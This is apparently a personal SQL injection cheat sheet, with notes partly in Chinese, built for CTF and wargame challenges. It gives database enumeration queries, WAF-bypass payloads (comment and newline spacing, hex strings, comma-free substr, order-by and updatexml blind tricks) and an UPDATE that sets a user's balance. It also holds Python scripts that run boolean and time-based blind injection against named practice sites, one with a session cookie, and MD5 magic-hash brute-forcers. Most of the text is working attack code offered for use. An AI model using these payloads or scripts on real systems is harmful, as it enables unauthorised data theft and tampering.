# select based information
select database(); #查选数据库
select group_concat(schema_name) from information_schema.schemata
select schema_name from information_schema.schemata limit 0,1  #查询数据库
select table_name from information_schema.tables where table_schema=database() limit 0,1;  #查询表
select column_name from information_schema.columns where table_name='f14g' limit 0,1;  #查询列

# blank space replace

select/**/*/**/from/**/yz;
select%0a*%0afrom%0ayz; %0a 是回车
/*!select*//*!**//*!from*//*!yz*/;

select(a)from(yz);
select(a)from(yz)where(a=1);
# urldecode
select * from yz
select * from  %2579%257a

# quotes passby
select a from yz where b=0x32;
select * from yz where b=char(0x32);
select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)

select column_name  from information_schema.tables where table_name="users"
select column_name  from information_schema.tables where table_name=0x7573657273
# comma passby
mid(user() from 1 for 1)
substr(user() from 1 for 1)
select substr(user()from -1) from yz ;
select ascii(substr(user() from 1 for 1)) < 150;

同时也可以利用替换函数
select left(database(),2)>'tf';


selete * from testtable limit 2,1;
selete * from testtable limit 2 offset 1;

# Comparison passby
select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
select strcmp(left(database(),1),0x32);#lpad('asd',2,0)
if(substr(id,1,1)in(0x41),1,3)

新学习了一种骚骚的注入姿势in、between、order by
select * from yz where a in ('aaa');
select substr(a,1,1) in ('a') from yz ;

select * from yz where a between 'a' and 'b';
select * from yz where a between 0x89 and 0x90;

select * from yz union select 1,2,3 order by 1;
也可以用like，根据排列顺序进行真值判断
# annotator passby
select 1,2,3 from yz where '1'/1=(1=1)/'1'='1'


# order by

/?order=IF(1=1,1,(select+1+from+information_schema.tables)) #正常
/?order=IF(1=2,1,(select+1+from+information_schema.tables)) #错误


order=(select+1+regexp+if(1=1,1,0x00)) #正常
order=(select+1+regexp+if(1=2,1,0x00)) #错误

order=updatexml(1,if(1=1,1,user()),1) #正确
order=updatexml(1,if(1=2,1,user()),1) #错误


#------------------------some reality promble----------------------------------------------
UPDATE `users` SET  `money`=100 WHERE name='heheda'

select%0agroup_concat(schema_name)%0afrom%0ainformation_schema.schemata
kvm1
if((select substr(user() from 1 for 1)),2,1)

if((select ascii(substr(concat(schema_name),1,1)) from information_schema.schemata limit 1 offset 1)<1,1,0)
select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema='kvm1'
m_notice
select%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns where table_name='m_notice'
#blind sqlinjection based different content
import requests
cookies={
        'PHPSESSID': '944d46747cd9059f63dc2e103b2fe31a'
}

dic='3_abcdefghijklmnopqrstuvwxyz'
string = ''
for i in range(1,33):
    for j in dic:
        url='http://lab1.xseclab.com/sqli3_6590b07a0a39c8c27932b92b0e151456/index.php?id=1 and ord((select substr(table_name,{0},1) from information_schema.tables where table_schema=database())) = {1}'.format(str(i),ord(j))
        s=requests.get(url=url , cookies=cookies)
        content=s.content
        length=len(content)
        print length
        if length > 400 :
            string+=j
            break
    print string 

# blind sqlinjection based different content

import requests
url=r'http://web.jarvisoj.com:32787/login.php'
string=''
dic='0123456789abcdefghijklmnopqrstuvwxyz'
for i in range(1,33):
    for j in dic:
        id="/*'XOR(if(ord((select/**/substr(table_name,{0},1)/**/from/**/information_schema.tables/*!where*/table_schema=database()))={1},sleep(3),0))OR'*/".format(str(i),ord(j))
        data={
            'username':id,
            'password': 1
        }
        print j
        s=requests.post(url=url,data=data)
        sec=s.elapsed.seconds
        if sec > 2:
            string+=j
            break
    print string
# md5 crash

import random
import string
import re
def md5(str):
    import hashlib
    m = hashlib.md5().update(str).hexdigest()
    return m

while 1:
    string = ''
    s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4))
    if (re.findall('^0e[0-9]{14,14}$',md5('XIPU'+s)[8:24])):
        print 'XIPU'+s,md5('XIPU'+s)[8:24]


#----------------

import random
import string
def md5(str):
    import hashlib
    m = hashlib.md5()
    m.update(str)
    return m.hexdigest()
while 1:
    string = ''
    s = string.join(random.sample('qwertyuiopasdfghjklzxcvbnm1234567890',4))
    if md5(s)[0:6] == '58a204':
        print s

        break 


# binding sqlinject

# coding:utf-8
import requests
from math import ceil
global string
string = ''

def charge(mid,i):#判断大小
    url='http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=if(ascii(substr((select group_concat(readme) from chat_log_secret),{0},1))<={1},10000000000,23334)'.format(str(i),str(mid))
    #
    
    s=requests.get(url=url)
    content=s.content
    length=len(content)
    #print length
    if length > 10 :
        return 0
    else:
        return 1

def dichotomie(l,r,i):#利用二分法查找

    mid = (l+r)/2
    #print "l and r ,mid:",l,r,mid
    if l == r:
        global string
        string += chr(r)
        print string
        return 0
    if charge(mid,i):#<=
        #print 0
        dichotomie(l,mid,i)
    else:
        #print 1
        dichotomie(int(ceil((l+r)*1.0/2)),r,i)


for i in range(1,100):
    dichotomie(32,127,i)
print string